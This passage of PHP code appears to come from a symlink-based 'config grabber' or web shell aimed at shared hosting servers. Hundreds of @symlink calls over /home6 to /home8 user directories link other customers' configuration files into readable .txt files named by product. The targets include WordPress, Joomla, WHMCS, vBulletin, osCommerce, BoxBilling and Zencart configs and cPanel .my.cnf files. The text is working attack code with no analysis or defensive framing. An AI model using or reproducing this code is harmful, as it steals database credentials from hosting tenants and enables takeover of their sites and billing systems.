@symlink('/home6/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home6/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 7 

@symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home7/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home7/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home7/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 8 

@symlink('/home8/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home8/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home8/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
